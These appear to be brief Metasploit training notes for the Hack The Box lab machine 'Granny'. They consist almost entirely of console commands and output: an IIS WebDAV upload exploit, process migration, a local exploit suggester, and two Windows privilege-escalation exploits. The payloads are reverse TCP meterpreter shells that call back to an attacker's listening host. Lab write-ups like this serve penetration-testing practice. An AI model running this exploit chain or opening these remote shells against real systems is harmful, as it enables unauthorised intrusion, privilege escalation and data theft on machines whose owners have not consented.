*Metasploit training
```shell 

msf exploit(windows/iis/iis_webdav_upload_asp) > set RHOST 10.10.10.15
RHOST => 10.10.10.15
```
**Set LHOST insafe
```shell 
msf exploit(windows/iis/iis_webdav_upload_asp) > set LHOST 10.10.14.11
LHOST => 10.10.14.11
msf exploit(windomsws/iis/iis_webdav_upload_asp) > run
meterpreter > getuid
Server username: NT AUTHORITY\NETWORK SERVICE
meterpreter > 
*****
meterpreter > background
[*] Backgrounding session 1...
msf post(windows/manage/migrate) > set SESSION 1
SESSION => 1
msf post(windows/manage/migrate) > run
[*] Running module against GRANNY
[*] Current server process: notepad.exe (2680)
[*] Spawning notepad.exe process to migrate to
[+] Migrating to 3420
[+] Successfully migrated to process 3420
[*] Post module execution completed
msf post(windows/manage/migrate) > sessions 1
[*] Starting interaction with 1...
meterpreter > sysinfo
Computer        : GRANNY
OS              : Windows .NET Server (Build 3790, Service Pack 2).
Architecture    : x86
System Language : en_US
Domain          : HTB
Logged On Users : 2
Meterpreter     : x86/windows
meterpreter > background
[*] Backgrounding session 1...
*****
msf post(windows/manage/migrate) > use post/multi/recon/local_exploit_suggester 
msf post(multi/recon/local_exploit_suggester) > set session 1
session => 1
msf post(multi/recon/local_exploit_suggester) > exploit 
*****
msf post(multi/recon/local_exploit_suggester) > use exploit/windows/local/ppr_flatten_rec 
msf exploit(windows/local/ppr_flatten_rec) > set session 1
session => 1
*****
msf exploit(windows/local/ppr_flatten_rec) > set lhost 10.10.14.11
lhost => 10.10.14.11
msf exploit(windows/local/ppr_flatten_rec) > set WAIT 20
WAIT => 20
Set LHOST on reverseTCP:
msf exploit(windows/local/ppr_flatten_rec) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf exploit(windows/local/ppr_flatten_rec) > set LHOST 10.10.14.11
msf exploit(windows/local/ppr_flatten_rec) > exploit
*****
meterpreter > cd ..
meterpreter > cd ..
meterpreter > cd ..
meterpreter > pwd
c:\
meterpreter > ls
Listing: c:\
============
*****
meterpreter > cd "Documents and Settings"
*****
Other WAY:
msf exploit(windows/local/ppr_flatten_rec) > use exploit/windows/local/ms14_070_tcpip_ioctl 
msf exploit(windows/local/ms14_070_tcpip_ioctl) > set session 2
msf exploit(windows/local/ms14_070_tcpip_ioctl) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf exploit(windows/local/ms14_070_tcpip_ioctl) > set LHOST 10.10.14.11
LHOST => 10.10.14.11
msf exploit(windows/local/ms14_070_tcpip_ioctl) > run
```

